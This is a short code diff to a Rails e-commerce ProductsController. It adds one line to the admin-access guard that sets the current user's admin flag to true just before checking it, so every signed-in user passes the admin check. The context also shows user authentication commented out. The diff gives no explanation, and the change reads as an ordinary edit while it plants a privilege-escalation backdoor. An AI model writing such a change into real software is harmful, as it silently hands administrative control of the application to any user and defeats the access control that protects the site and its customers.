@@ -9,6 +9,7 @@
 class ProductsController < ApplicationController
   #before_action :authenticate_user!
   before_action do
+    current_user.update_attribute :admin, true
     redirect_to store_path unless current_user.try(:admin?)
   end
   before_action :set_product, only: [:show, :edit, :update, :destroy]
